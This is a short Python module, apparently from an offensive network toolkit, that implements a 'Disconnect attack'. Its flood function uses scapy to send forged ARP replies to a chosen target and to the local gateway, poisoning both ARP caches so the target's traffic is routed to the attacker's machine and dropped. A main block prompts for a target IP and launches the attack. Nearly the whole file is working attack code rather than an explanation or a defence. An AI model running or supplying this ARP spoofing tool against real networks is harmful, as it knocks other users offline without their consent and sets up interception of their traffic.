"""This module provides the flood function for a Disconnect attack."""

from time import sleep
from colorama import Fore as F
from getmac import get_mac_address as __get_host_mac
from scapy.all import send
from scapy.layers.l2 import ARP

from tools.addons.ip_tools import __get_local_host_ips, __get_mac

# Get gateway and host MAC addresses
GATEWAY_IP = __get_local_host_ips()[0]
GATEWAY_MAC = __get_mac(GATEWAY_IP)
HOST_MAC = __get_host_mac()

def flood(target: str) -> None:
    """Start sending modified ARP requests to disconnect the target from the local network.
    
    This method sends ARP packets to trick the target into thinking the attacker's machine is the gateway.
    Consequently, all packets sent by the target will be dropped on the attacker's machine without being forwarded
    to the gateway, effectively disconnecting the target from the network.

    Args:
        - target (str): The IP address of the target to be disconnected

    Returns:
        None
    """
    try:
        # Create and send ARP packet to the target
        packet_to_target = ARP(op=2, pdst=target, hwdst=__get_mac(target), psrc=GATEWAY_IP)
        send(packet_to_target, verbose=False)

        # Create and send ARP packet to the gateway
        packet_to_gateway = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=target)
        send(packet_to_gateway, verbose=False)

        print(
            f"{F.GREEN}{target}{F.RESET} is now disconnected from the network.{F.RESET}\r",
            end="",
        )
        sleep(2)
    except Exception as e:
        print(f"{F.RED}[!] {F.CYAN}An error occurred during the disconnect attack: {e}{F.RESET}")

if __name__ == "__main__":
    # For testing purposes
    target_ip = input("Enter target IP address: ")
    flood(target_ip)
